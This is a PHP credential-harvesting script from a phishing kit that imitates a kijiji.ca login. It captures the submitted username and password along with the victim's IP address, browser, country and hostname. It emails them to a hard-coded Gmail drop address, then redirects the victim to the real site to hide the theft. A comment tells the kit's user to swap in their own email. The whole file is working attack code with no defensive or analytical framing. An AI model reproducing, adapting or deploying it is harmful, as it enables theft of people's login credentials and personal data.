<?php



$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='. $ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g:i a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------kijiji.ca Info-----------------------\n";
$message .= "Username            : ".$_POST['text1']."\n";
$message .= "Password            : ".$_POST['text2']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "IP                     : ".$ip."\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime               : ".$timedate."\n";
$message .= "Country                : ".$country."\n";
$message .= "HostName               : ".$hostname."\n";
$message .= "---------------Created BY unknown-------------\n";
//change ur email here 
$send = "allreseultboxes@gmail.com";
$subject = "Result from $ip";
$headers = "From: kijijilogin";
$headers .= $_POST['eMailAdd'] . "\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
		   header("Location: https://kijiji.ca");

	
	 
?>